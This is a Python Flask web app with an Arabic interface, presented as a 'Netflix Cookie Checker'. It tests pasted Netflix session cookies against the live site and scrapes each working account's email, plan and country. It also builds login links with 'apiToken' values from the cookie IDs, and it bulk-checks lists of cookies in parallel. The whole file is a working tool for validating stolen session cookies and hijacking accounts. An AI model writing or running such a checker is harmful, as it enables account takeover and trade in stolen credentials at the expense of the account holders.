from flask import Flask, render_template_string, request, jsonify
import requests, re, json, base64
from datetime import datetime
import os

app = Flask(__name__)

HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>Netflix Cookie Checker</title>
<style>body{font-family:sans-serif;background:#141414;color:#fff;padding:20px}textarea{width:100%;height:150px;background:#222;color:#fff;border:1px solid #444}button{background:#e50914;color:#fff;padding:10px 20px;border:none;margin:5px;cursor:pointer}.card{background:#1e1e1e;padding:15px;margin:10px 0;border-radius:8px;border-left:4px solid #e50914}.valid{border-left-color:#2ecc71}.invalid{border-left-color:#e50914}.error{border-left-color:#f39c12}</style>
</head>
<body><h1 style="color:#e50914">🔍 فاحص كوكيز Netflix</h1>
<textarea id="cookieInput" placeholder="الصق الكوكيز هنا..."></textarea>
<button onclick="check()">فحص</button>
<div id="results"></div>
<script>
async function check(){
const c=document.getElementById('cookieInput').value.trim();
if(!c)return alert('أدخل الكوكيز');
const r=await fetch('/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:c})});
const d=await r.json();
document.getElementById('results').innerHTML='<div class="card '+(d.status==='valid'?'valid':d.status==='invalid'?'invalid':'error')+'"><strong>'+d.message+'</strong>'+(d.details?.email?'<br>📧 '+d.details.email:'')+'</div>';
}
</script></body></html>'''

def check_cookie(cookie):
    try:
        h={'Cookie':cookie,'User-Agent':'Mozilla/5.0'}
        r=requests.get('https://www.netflix.com/YourAccount',headers=h,timeout=10,allow_redirects=False)
        result={'status':'unknown','message':'','details':{},'api_tokens':{},'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        if r.status_code==200:
            if 'membershipStatus' in r.text:
                mm=re.search(r'"membershipStatus"\s*:\s*"([^"]+)"',r.text)
                pm=re.search(r'"planName"\s*:\s*"([^"]+)"',r.text)
                cm=re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"',r.text)
                em=re.search(r'"email"\s*:\s*"([^"]+)"',r.text)
                result['status']='valid'
                result['message']='✅ كوكيز صالحة'
                result['details']={'membership':mm.group(1)if mm else 'غير معروف','plan':pm.group(1)if pm else 'غير معروف','country':cm.group(1)if cm else 'غير معروف','email':em.group(1)if em else 'غير معروف'}
                nid=None;sid=None
                for p in cookie.split(';'):
                    p=p.strip()
                    if p.startswith('NetflixId='):nid=p.split('=',1)[1]
                    elif p.startswith('SecureNetflixId='):sid=p.split('=',1)[1]
                if nid and sid:
                    payload={'netflixId':nid,'secureNetflixId':sid,'timestamp':datetime.now().isoformat()}
                    token=base64.b64encode(json.dumps(payload).encode()).decode().replace('+','-').replace('/','_').replace('=','')
                    result['api_tokens']={'api_token':token,'direct_links':{'computer':{'name':'💻 كمبيوتر','url':f'https://www.netflix.com/Login?apiToken={token}'},'mobile':{'name':'📱 جوال','url':f'https://www.netflix.com/Login?apiToken={token}&deviceType=mobile'},'tv':{'name':'📺 تلفاز','url':f'https://www.netflix.com/tv/login?apiToken={token}'}}}
            else:
                result['status']='valid'
                result['message']='✅ كوكيز صالحة (تم تسجيل الدخول)'
        elif r.status_code==302:
            result['status']='invalid'
            result['message']='❌ منتهية الصلاحية'
        else:
            result['status']='error'
            result['message']=f'⚠️ خطأ {r.status_code}'
        return result
    except Exception as e:
        return {'status':'error','message':str(e),'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/check',methods=['POST'])
def check():
    data=request.get_json()
    cookie=data.get('cookie','')
    if not cookie:return jsonify({'status':'error','message':'لا كوكيز'})
    return jsonify(check_cookie(cookie))

@app.route('/check_multiple',methods=['POST'])
def check_multiple():
    data=request.get_json()
    cookies=data.get('cookies','')
    if not cookies:return jsonify({'status':'error'})
    lines=[c.strip()for c in cookies.split('\n')if c.strip()and'='in c]
    from concurrent.futures import ThreadPoolExecutor,as_completed
    results=[]
    with ThreadPoolExecutor(max_workers=10)as ex:
        futs={ex.submit(check_cookie,c):i for i,c in enumerate(lines,1)}
        for f in as_completed(futs):
            try:
                res=f.result()
                res['index']=futs[f]
                results.append(res)
            except:pass
    results.sort(key=lambda x:x.get('index',0))
    return jsonify({'results':results})

if __name__=='__main__':
    app.run(host='0.0.0.0',port=int(os.environ.get('PORT',5000)))